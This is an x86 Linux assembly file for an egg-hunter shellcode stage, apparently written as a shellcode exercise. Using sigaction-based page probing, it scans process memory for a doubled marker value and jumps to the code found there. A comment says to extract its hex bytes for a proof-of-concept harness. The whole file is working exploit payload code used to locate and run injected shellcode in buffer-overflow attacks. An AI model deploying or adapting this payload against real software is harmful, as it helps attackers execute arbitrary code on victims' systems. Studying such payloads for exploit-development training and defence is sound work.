; Content:  egg_hunter via sigaction method
; Author:   
; Date:     02/2019
;
;
; For testing extract hexcode from this file and use it poc.c for eggHunting
;
;


global _start

_start:
    xor ecx,ecx         ; clear ecx
align_page:
    or cx,0xfff         ; Add page_size into ecx
next_address:
    inc ecx		
    push byte +0x43     ; 67
    pop eax             ; eax = 67 (67=sigaction)
    int 0x80            ; exec sigaction
    cmp al,0xf2         ; check if eax equal to 0xf2. If equal, efault happened, efault = return value 242
    jz align_page       ; if efault happens,	try next page
    mov eax, 0x50905090 ; if not, then set eax to 0x50905090, which is EGG
    mov edi, ecx        ; Move address to edi
    scasd               ; Compare eax against edi and increment by 4 bytes. eax == edi?
    jnz next_address    ; if does not match, jump to next address
    scasd               ; if match occurs:	check mathch in second half. eax == [edi+4]?
    jnz next_address    ; if does not match, jump to next address
    jmp edi             ; if match, jump to Shellcode
